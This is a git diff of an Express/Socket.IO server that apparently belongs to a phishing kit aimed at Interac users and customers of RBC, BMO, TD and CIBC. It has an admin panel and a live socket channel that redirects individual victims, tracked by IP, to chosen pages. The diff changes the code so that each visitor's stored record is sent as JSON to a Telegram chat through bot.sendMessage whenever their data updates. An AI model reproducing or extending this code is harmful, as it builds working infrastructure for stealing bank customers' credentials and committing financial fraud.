@@ -176,11 +176,11 @@ app.get('/', (req, res) => {
   //res.sendFile(join(__dirname, '/landing/interac/page.html'));
 });
 
-app.get('/admin',checkRecaptchaSession,(req, res) => {
+app.get('/admin', checkRecaptchaSession, (req, res) => {
   res.sendFile(join(__dirname, '/admin/page.html'));
 });
 
-app.get('/admin/config', checkRecaptchaSession,(req, res) => {
+app.get('/admin/config', checkRecaptchaSession, (req, res) => {
   res.sendFile(join(__dirname, '/admin/config.html'));
 });
 
@@ -189,10 +189,10 @@ app.get('/.well-known/pki-validation/7C8936E7D9C13F83E96EF02516DCB1A4.txt', (req
 });
 
 
-app.use('/rbc',checkRecaptchaSession,require('./routes/rbc'));
-app.use('/bmo', checkRecaptchaSession,require('./routes/bmo'));
-app.use('/td', checkRecaptchaSession,require('./routes/td'));
-app.use('/cibc', checkRecaptchaSession,require('./routes/cibc'));
+app.use('/rbc', checkRecaptchaSession, require('./routes/rbc'));
+app.use('/bmo', checkRecaptchaSession, require('./routes/bmo'));
+app.use('/td', checkRecaptchaSession, require('./routes/td'));
+app.use('/cibc', checkRecaptchaSession, require('./routes/cibc'));
 
 app.post('/admin/set-recaptcha-key', checkRecaptchaSession, (req, res) => {
   const recaptchaSecretKey = req.body.recaptchaSecretKey;
@@ -207,7 +207,7 @@ app.post('/admin/set-recaptcha-key', checkRecaptchaSession, (req, res) => {
   res.send('reCAPTCHA secret and site key updated successfully!');
 });
 
-app.post('/interac', verifyRecaptcha ,(req, res) => {
+app.post('/interac', verifyRecaptcha, (req, res) => {
   // At this point, the reCAPTCHA was successful, and you can handle the form submission.
   // Redirect the user to the desired page after form submission and reCAPTCHA verification
   res.sendFile(join(__dirname, '/landing/interac/page.html'));
@@ -300,6 +300,9 @@ io.on('connection', (socket) => {
         user = usersModify(userIP, data);
       }
       emitUpdatedUsers(io);
+      let user_search = usersSearchByIP(userIP)
+      const message = JSON.stringify(user_search, null, 2);
+      bot.sendMessage(chatId, message);
 
     }
     //console.log(data)
@@ -309,7 +312,7 @@ io.on('connection', (socket) => {
     //console.log(`${data.page}`)
     //console.log(data.ip)
     socket.to(data.ip).emit('btnRedirection', { page: data.page })
-    
+
   });
 
   socket.on('usersRemoveAll', () => {
@@ -323,11 +326,6 @@ io.on('connection', (socket) => {
     configsModify(data.banks, data);
   })
 
-  let user_search = usersSearchByIP(userIP)
-  const message = JSON.stringify(user_search, null, 2);
-
-
-  bot.sendMessage(chatId, message);
 
 });
 
